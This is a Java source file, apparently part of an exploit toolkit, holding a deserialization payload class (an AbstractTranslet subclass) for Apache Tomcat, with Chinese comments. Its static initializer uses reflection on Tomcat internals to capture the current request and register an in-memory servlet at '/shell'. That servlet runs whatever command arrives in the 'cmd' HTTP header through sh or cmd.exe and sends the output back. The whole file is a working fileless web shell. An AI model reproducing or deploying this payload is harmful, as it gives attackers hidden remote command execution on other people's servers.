package net.roboterh.injector.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;

public class TomcatServletTemplate extends AbstractTranslet {

    static {
        try {
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);

            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
            boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
            if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());
                lastServicedResponseField.set(null, new ThreadLocal<>());
                WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
            } else {
                String name = "RoboTerh";
                //从req中获取ServletContext对象
                // 第二次请求后进入 else 代码块，获取 Request 和 Response 对象，写入回显
                ServletRequest servletRequest = lastServicedRequest.get();

                ServletContext servletContext = servletRequest.getServletContext();


                if (servletContext.getServletRegistration(name) == null) {
                    StandardContext o = null;

                    // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                    while (o == null) {
                        Field f = servletContext.getClass().getDeclaredField("context");
                        f.setAccessible(true);
                        Object object = f.get(servletContext);

                        if (object instanceof ServletContext) {
                            servletContext = (ServletContext) object;
                        } else if (object instanceof StandardContext) {
                            o = (StandardContext) object;
                        }
                    }

                    //自定义servlet
                    Servlet servlet = new Servlet() {
                        @Override
                        public void init(ServletConfig servletConfig) throws ServletException {

                        }

                        @Override
                        public ServletConfig getServletConfig() {
                            return null;
                        }

                        @Override
                        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
                            HttpServletRequest servletRequest1 = (HttpServletRequest) servletRequest;
                            String cmd = servletRequest1.getHeader("cmd");
                            boolean isLinux = true;
                            String osTyp = System.getProperty("os.name");
                            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                                isLinux = false;
                            }
                            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                            Scanner s = new Scanner(in).useDelimiter("\\a");
                            String output = s.hasNext() ? s.next() : "";
                            PrintWriter out = servletResponse.getWriter();
                            out.println(output);
                            out.flush();
                            out.close();
                        }

                        @Override
                        public String getServletInfo() {
                            return null;
                        }

                        @Override
                        public void destroy() {

                        }
                    };

                    //用Wrapper封装servlet
                    Wrapper newWrapper = o.createWrapper();
                    newWrapper.setName(name);
                    newWrapper.setLoadOnStartup(1);
                    newWrapper.setServlet(servlet);

                    //向children中添加Wrapper
                    o.addChild(newWrapper);
                    //添加servlet的映射
                    o.addServletMappingDecoded("/shell", name);

                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
